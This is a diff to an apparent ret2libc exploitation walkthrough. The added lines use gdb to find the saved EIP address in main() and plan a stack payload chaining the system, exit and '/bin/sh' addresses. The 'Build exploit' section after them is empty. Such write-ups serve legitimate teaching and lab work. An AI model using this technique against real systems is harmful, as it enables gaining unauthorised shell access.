@@ -83,6 +83,25 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 0xf7f897ec:	 "/bin/sh"
 ```
 
+Find the EIP return address in the ```main()``` function. 
+```
+(gdb) info frame
+Stack level 0, frame at 0xffffd6c0:
+ eip = 0x8048723 in main; saved eip 0xf7e45513
+ Arglist at unknown address.
+ Locals at unknown address, Previous frame's sp is 0xffffd6c0
+ Saved registers:
+  eip at 0xffffd6bc
+```
+
+We're going to write our payload at the address of EIP. 
+```
+[ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
+   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec
+```
+
+
+
 ### Build exploit
 
 
